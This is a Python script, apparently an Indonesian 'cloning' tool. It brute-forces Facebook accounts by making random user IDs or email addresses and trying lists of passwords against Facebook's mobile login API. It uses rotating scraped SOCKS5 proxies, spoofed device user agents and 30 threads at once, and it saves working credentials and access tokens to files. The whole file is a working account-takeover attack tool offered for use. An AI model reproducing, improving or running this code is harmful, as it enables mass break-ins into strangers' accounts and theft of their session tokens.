###---[ INFO AUTHOR GANS DIKIT ]---###
author = 'Rochmat Basuki'
git_hub = 'github.com/RozhBasXYZ'
faceb0ok = 'ROCHMAT BASUKI XD'
version = 'blade cloning v.1'


###---[ WARNA ]--###
P = '\033[97m'  # PUTIH
M = '\033[91m' # MERAH
hh = '\033[92m'  # HIJAU
kk = '\033[93m'  # KUNING


###---[ IMPORT MODULE ]---###
import random, sys, os, time, datetime, uuid, string, bs4, requests
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from time import sleep
from bs4 import BeautifulSoup as parser
try:
	import pyfiglet
except:
	print(f' [{kk}<{P}] module pyfiglet belum terinstal')
	os.system('pip install pyfiglet')
	
	
###---[ SIMPLE LOGO ]---###	
def logo():
	return ("""   ____   _        ___    _   _   ___   _   _    ____
  / ___| | |      / _ \  | \ | | |_ _| | \ | |  / ___|
 | |     | |     | | | | |  \| |  | |  |  \| | | |  _
 | |___  | |___  | |_| | | |\  |  | |  | |\  | | |_| |
  \____| |_____|  \___/  |_| \_| |___| |_| \_|  \____|""")
	

###--[ GLOBAL NAME ]---###
pro , dump = [] , []
ok , cp , loop = 0 , 0 , 0
ses = requests.Session()
_ = version.split(' ')[0]
rr = random.randint
rc = random.choice


###---[ USERAGENT & PROXY ]---###
try:
	bz = requests.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=100000000&country=all&ssl=all&anonymity=all').text
	for x in bz.splitlines():
		pro.append(x)
except:pass
def ugen():
	rc = random.choice
	rr = random.randint
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	A = f'Mozilla/5.0 (Linux; U; Android {str(rr(7,12))}; en-US; '
	B = f'SM-{str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))}) AppleWebKit/534.30 (KHTML, like Gecko) '
	C = f'Version/4.0 Mobile Safari/534.30 Mobile UCBrowser/3.4.3.{str(rr(111,999))}'
	D = f'[FBAN/EMA;FBLC/it_IT;FBAV/{str(rr(111,999))}.0.0.10.{str(rr(111,999))};]'
	tol = f'{A}{B}{C}{D}'
	return str(tol)
	

###---[ CLEAR LAYAR ]---###
def clear_layar():
	try:os.system('clear')
	except:pass


###---[ TANGGAL ]---###
sasi = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
tete = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mai", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
now = datetime.now()
hari = now.day
blx = now.month
try:
	if blx < 0 or blx > 12:exit()
	xx = blx - 1
except ValueError:exit()
bulan = sasi[xx]
tahun = now.year
tanggal = str(hari)+'-'+str(bulan)+'-'+str(tahun)
sim_ok = f'OK-{hari}-{bulan}-{tahun}.txt'
sim_cp = f'CP-{hari}-{bulan}-{tahun}.txt'


###---[ AUTO PRINT ]---###
def save_hasil():
	print(f"\r{P} ────────────────────────────────────")
	print(f' akun ok di : {sim_ok}\n akun cp di : {sim_cp}')
	print(f"\r{P} ────────────────────────────────────")

		
###---[ MENU ]---###
def menu_utama():	
	print(logo()+f'\n script by {kk}rochmat basuki{P}, github {kk}rozhbasxyz{P} version {kk}1.5{P}\n\n')	
	if len(_)==5:pass
	else:sys.exit(f' [{M}<{P}] hayo mau recode')
	print(f' [{hh}1{P}]. cloning 2004-2006')
	print(f' [{hh}2{P}]. cloning 2006-2008')
	print(f' [{hh}3{P}]. cloning 2009-2010')
	print(f' [{hh}4{P}]. cloning 2010-2014')
	print(f' [{hh}5{P}]. cloning 2014-2022')
	print(f' [{hh}6{P}]. cloning dari mail')
	print(f' [{hh}7{P}]. cek hasil cloning')
	dgt = input(" menu : ")
	print(f"\r{P} ────────────────────────────────────")
	if dgt in ["1","01"]:cloning1()
	elif dgt in ["2","02"]:cloning2()
	elif dgt in ["3","03"]:cloning3()
	elif dgt in ["4","04"]:cloning4()
	elif dgt in ["5","05"]:cloning5()
	elif dgt in ["6","06"]:clon_email()
	elif dgt in ["7","07"]:cek_hasil()
	else:sys.exit(f' [{M}<{P}] isi yang benar')


###---[CEK HASIL CRACK ]---###
def cek_hasil():
	no = 0
	nom = []
	one = input(f' [{hh}1{P}] cek hasil akun ok\n [{hh}2{P}] cek hasil akun cp\n menu : ')
	if one in ['1','01']:
		try:ok = os.listdir('OKC')
		except:sys.exit(f" [{M}>{P}] tidak hasil ok")
		if len(ok)==0:sys.exit(f" [{M}>{P}] tidak hasil ok")
		for x in ok:
			nom.append(x)
			no+=1
			print(f' [{hh}{no}{P}] {x}')
		bz = input(f' [{hh}<{P}] nomor file : ')
		file = nom[int(bz)-1]
		try:buka = open('OKC/'+file,'r').read()
		except:sys.exit(f" [{M}>{P}] file tidak ada hasil ok")
		print(hh+" "+buka+P)
	elif one in ['2','02']:
		try:ok = os.listdir('CPC')
		except:sys.exit(f" [{M}>{P}] tidak hasil cp")
		if len(ok)==0:sys.exit(f" [{M}>{P}] tidak hasil cp")
		for x in ok:
			nom.append(x)
			no+=1
			print(f' [{kk}{no}{P}] {x}')
		bz = input(f' [{hh}<{P}] nomor file : ')
		file = nom[int(bz)-1]
		try:buka = open('CPC/'+file,'r').read()
		except:sys.exit(f" [{M}>{P}] file tidak ada hasil cp")
		print(kk+" "+buka+P)
	else:sys.exit(f" [{M}>{P}] isi yang benar")

		
###----[ CLONING 2004-2006 ]---###
def cloning1():
	global ok , cp
	print(f' [{hh}>{P}] cloning 2004-2006, 10% dapat hasil')
	tol = input(' total : ')
	bas = input(' sandi : ').split(',')
	for xyz in range(int(tol)):
		A = rr(7,8)
		B = rr(0,4)
		C = rr(11111,99999)
		D = f'{A}{B}{C}'
		if D in dump:pass
		else:dump.append(D)
		print('\r sedang dump %s id'%(len(dump)),end='')
		sys.stdout.flush()
		sleep(0.0000003)
	save_hasil()
	with ThreadPoolExecutor(max_workers=30) as babas:
		for rozh in dump:
			babas.submit(rozhbasxyz().brute,rozh,bas,'xyz')
	exit(f'\r [{hh}<{P}] crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')
	
	
###----[ CLONING 2006-2008 ]---###
def cloning2():
	global ok , cp
	print(f' [{hh}>{P}] cloning 2006-2008, 15% dapat hasil')
	tol = input(' total : ')
	bas = input(' sandi : ').split(',')
	for xyz in range(int(tol)):
		A = rr(5,8)
		B = rr(11111111,99999999)
		C = f'{A}{B}'
		if C in dump:pass
		else:dump.append(C)
		print('\r sedang dump %s id'%(len(dump)),end='')
		sys.stdout.flush()
		sleep(0.0000003)
	save_hasil()
	with ThreadPoolExecutor(max_workers=30) as babas:
		for rozh in dump:
			babas.submit(rozhbasxyz().brute,rozh,bas,'xyz')
	exit(f'\r [{hh}<{P}] crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')

	
###----[ CLONING 2009-2010 ]---###
def cloning3():
	global ok , cp
	print(f' [{hh}>{P}] cloning 2009-2010, 50% dapat hasil')
	tol = input(' total : ')
	bas = input(' sandi : ').split(',')
	for xyz in range(int(tol)):
		A = f'1{str(rr(1,4))}'
		B = rr(11111111,99999999)
		C = f'{A}{B}'
		if C in dump:pass
		else:dump.append(C)
		print('\r sedang dump %s id'%(len(dump)),end='')
		sys.stdout.flush()
		sleep(0.0000003)
	save_hasil()
	with ThreadPoolExecutor(max_workers=30) as babas:
		for rozh in dump:
			babas.submit(rozhbasxyz().brute,rozh,bas,'xyz')
	exit(f'\r [{hh}<{P}] crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')
		

###----[ CLONING 2010-2014 ]---###
def cloning4():
	global ok , cp
	print(f' [{hh}>{P}] cloning 2010-2014, 50% dapat hasil')
	tol = input(' total : ')
	bas = input(' sandi : ').split(',')
	for xyz in range(int(tol)): 
		A = '10000'
		B = rr(1,6)
		C = rr(111111111, 999999999)
		D = f'{A}{B}{C}'
		if D in dump:pass
		else:dump.append(D)
		print('\r sedang dump %s id'%(len(dump)),end='')
		sys.stdout.flush()
		sleep(0.0000003)
	save_hasil()
	with ThreadPoolExecutor(max_workers=30) as babas:
		for rozh in dump:
			babas.submit(rozhbasxyz().brute,rozh,bas,'xyz')
	exit(f'\r [{hh}<{P}] crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')
		
																														    ###----[ CLONING 2014-2022 ]---###
def cloning5():
	global ok , cp
	print(f' [{hh}>{P}] cloning 2010-2014, 50% dapat hasil')
	tol = input(' total : ')
	bas = input(' sandi : ').split(',')
	for xyz in range(int(tol)): 
		A = '1000'
		B = rr(1,8)
		C = rr(1111111111, 9999999999)
		D = f'{A}{B}{C}'
		if D in dump:pass
		else:dump.append(D)
		print('\r sedang dump %s id'%(len(dump)),end='')
		sys.stdout.flush()
		sleep(0.0000003)
	save_hasil()
	with ThreadPoolExecutor(max_workers=30) as babas:
		for rozh in dump:
			babas.submit(rozhbasxyz().brute,rozh,bas,'xyz')
	exit(f'\r [{hh}<{P}] crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')
		

###---[ CLONING EMAIL ]---###
def clon_email():
	bas = []
	global ok , cp
	print(f' [{hh}>{P}] cloning dari email, 10% dapat hasil')
	nama = input(' target : ')
	if ',' in str(nama) or ' ' in str(nama):
		exit(f' [{M}<{P}] masukan nama depan saja')
	doma = input(' domain : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		exit(f' [{M}<{P}] masukan domain yang benar')
	you = input(' sandi : ').split(',')
	jumlah = input(' total  : ')
	for xyz in range(int(jumlah)):
		A = nama
		B = xyz
		C = doma
		D = f'{A}{B}{C}'
		if D in dump:pass
		else:dump.append(D)
		print('\r sedang dump %s id'%(len(dump)),end='')
		sys.stdout.flush()
		sleep(0.0000003)
	save_hasil()
	for z in you:
		bas.append(z)
	bas.append(nama+'123')
	bas.append(nama+'12345')
	with ThreadPoolExecutor(max_workers=30) as babas:
		for rozh in dump:
			babas.submit(rozhbasxyz().brute,rozh,bas,'xyz')
	exit(f'\r [{hh}<{P}] crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')
		
																														
###---[ CRACK ]---###							
class rozhbasxyz:
	def brute(self,user,paslist,kwargs):
		global ok , cp , loop
		self.ua = ugen()
		self.r = requests.Session()
		self.proxy = {"http": "socks5://{random.choice(pro)}"}
		if len(_)==5:pass
		else:sys.exit(f' [{M}<{P}] hayo mau recode')
		print(f'\r [{str(rc([kk,hh,M]))}>{P}] cloning {loop}/{len(dump)} OK:{ok} CP:{cp}',end='');sys.stdout.flush()
		for pw in paslist:
			try:
				hd = {
				"x-fb-connection-bandwidth": str(rr(20000000.0, 30000000.0)),
				"x-fb-sim-hni": str(rr(20000, 40000)),
				"x-fb-net-hni": str(rr(20000, 40000)),
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": self.ua,
				"content-type": "application/x-www-form-urlencoded",
				"x-fb-http-engine": "Liger"
				}
				post = self.r.get(f"https://b-api.facebook.com/method/auth.login?format=json&email={user}&password={pw}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",headers=hd,proxies=self.proxy)
				if "session_key" in post.text and "EAAA" in post.text:
					print(f"\r [{hh}>{P}] email  : {hh}{user}                \n {P}[{hh}>{P}] sandi  : {hh}{pw}                \n {P}[{hh}>{P}] cookie : {hh}{post.json()['access_token']}{P}\n")
					ok+=1
					open('OKC/'+sim_ok,'a').write(user+'|'+pw+'\n')
					break
				elif "User must verify their account" in post.text:
					print(f"\r [{kk}>{P}] email  : {kk}{user}           \n {P}[{kk}>{P}] sandi  : {kk}{pw}                                                        \n")
					cp+=1
					open('CPC/'+sim_cp,'a').write(user+'|'+pw+'\n')
				else:
					#print("facebook.com/"+user)
					continue
			except requests.exceptions.ConnectionError:
				sleep(20)
		loop+=1
			
			
###---[ MKDIR FOLDER ]---###			
def makedirectory():
	try:os.mkdir('OKC')
	except:pass
	try:os.mkdir('CPC')
	except:pass
	clear_layar()
	menu_utama()

if __name__=='__main__':
	makedirectory()
